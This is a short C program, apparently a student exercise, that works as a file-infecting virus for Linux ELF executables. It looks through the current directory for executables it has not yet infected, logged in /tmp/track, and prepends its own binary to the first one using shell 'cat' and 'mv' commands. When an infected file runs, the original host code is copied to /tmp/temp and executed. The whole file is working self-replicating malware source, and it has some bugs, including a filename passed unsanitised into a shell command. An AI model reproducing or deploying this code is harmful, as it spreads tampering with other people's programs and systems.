// Kenan Anil Akisik
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <elf.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>
#define VIRUS_SIZE 10896

//void merge(FILE
int main(int argc, char *argv[], char *envp[])
{
	/* declare a file pointer */
	FILE              *infile,*cur;
	FILE              *tracker;
	char              command1[100];
	char              command2[100];
	unsigned char     *buffer;
	char              *hbuff[16];
	char              *trackerbuffer;
	long              trackerbytes;
	long              numbytes;
	int               hostsize;
	int               length,i;
	char              *cwd;
	DIR               *dir;
	struct            dirent *ent;
	struct            stat sb;
	Elf32_Ehdr        ehdr;
	char mode[] = "0755";
	i = strtol(mode, 0, 8);

	cwd = getcwd (0, 0);
	dir = opendir(cwd);

	/*Check Elf heades*/
	while((ent = readdir(dir)) != NULL)
	{
		cur=fopen(ent->d_name, "rb");
		fread(&ehdr,1, sizeof(&ehdr), cur);
		stat(ent->d_name,&sb);

		tracker = fopen("/tmp/track","a+");
		fseek(tracker,0L, SEEK_END);
		trackerbytes = ftell(tracker);
		fseek(tracker,0L, SEEK_SET);
		trackerbuffer = (char*)calloc(trackerbytes, sizeof(char));
		fread(trackerbuffer, sizeof(char), trackerbytes, tracker);

		if(
				ehdr.e_ident[0] != ELFMAG0 ||
				ehdr.e_ident[1] != ELFMAG1 ||
				ehdr.e_ident[2] != ELFMAG2 ||
				ehdr.e_ident[3] != ELFMAG3 ||
				//ehdr.e_type != ET_DYN ||
				S_ISREG(sb.st_mode) == 0 ||
				strstr(trackerbuffer,ent->d_name) ||
				strcmp(ent->d_name,"virus") == 0
		  )
		{
			printf("\n\nFile: %s is not an ElF exe",ent->d_name);
		}
		else
		{
			printf("\n\nInfecting: %s",ent->d_name);
			break;

		}

	}
	//if(ent == NULL) return 0;
	/*Infecting Elf Executable*/

	sprintf(command1,"cat virus %s > infected", ent->d_name);
	sprintf(command2,"mv infected %s", ent->d_name);
	system(command1);
	chmod("infected",i);
	system(command2);

	/*update tracker*/
	fseek(tracker,0L, SEEK_SET);
	char write[strlen(ent->d_name)];
	sprintf(write,"%s",ent->d_name);
	fwrite(write, sizeof(char), sizeof(write), tracker);
	fclose(tracker);

	if(argv[0] == "virus") return 0;
	infile = fopen(argv[0], "rb");

	if(infile == NULL)
		return 1;

	/* Get the number of bytes */
	fseek(infile, 0L, SEEK_END);
	numbytes = ftell(infile);
	hostsize = numbytes - VIRUS_SIZE;

	/* reset the file position indicator to the beginning of the file */
	fseek(infile, VIRUS_SIZE, SEEK_SET);

	/* reserver memory for the buffer to hold the text */
	buffer = (char*)calloc(hostsize, sizeof(char));

	/* memory error */
	if(buffer == NULL)
		return 1;

	/* copy original code to a buffer*/
	fread(buffer, sizeof(int), hostsize, infile);
	fclose(infile);

	/* write original code to a temp file*/
	FILE *fp = fopen("/tmp/temp", "wb");
	fwrite(buffer, sizeof(int), hostsize, fp);
	chmod("/tmp/temp",i);
	fclose(fp);
	free(buffer);

	printf("Hello! I am a simple virus!\n");
	execv("/tmp/temp",argv);
	return 0;
}



